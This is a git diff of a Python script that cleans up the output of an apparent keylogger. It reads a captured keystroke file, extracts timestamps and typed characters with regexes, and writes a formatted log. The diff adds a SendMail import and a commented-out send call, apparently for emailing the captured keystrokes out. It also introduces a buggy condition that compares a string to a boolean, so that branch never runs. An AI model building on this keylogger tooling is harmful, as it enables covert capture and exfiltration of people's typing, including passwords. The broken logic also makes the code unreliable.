@@ -1,11 +1,13 @@
 import re
 
+from django.forms import EmailField
+from Email import SendMail
+
 my_file = open("/Users/darren/Documents/Keylogger/keyLog.txt")
 
 class Cleanup:
     def format_output():
         string_list = my_file.readlines()
-        string_list.pop(0)
 
         date_time = "\d{4}\W\d{2}\W\d{2}\s\d{2}\W\d{2}\W\d{2}"
         words = "[a-zA-Z]"
@@ -37,7 +39,11 @@ class Cleanup:
             if(re.findall("\d", item)):
                 keyLogger_output[i] = re.findall("\d", item)[0]
 
-        keyLogger_output = ''.join(keyLogger_output[1:])
+        if(str(isinstance(keyLogger_output[0], str)) == True):
+            keyLogger_output = ''.join(keyLogger_output)
+        else:
+            keyLogger_output = ''.join(keyLogger_output[1:])
+
         print(date_time + " \n" + keyLogger_output)
 
         with open('keyLogFormatted.txt', 'w') as f:
@@ -45,3 +51,4 @@ class Cleanup:
 
 
 Cleanup.format_output()
+#SendMail.send()
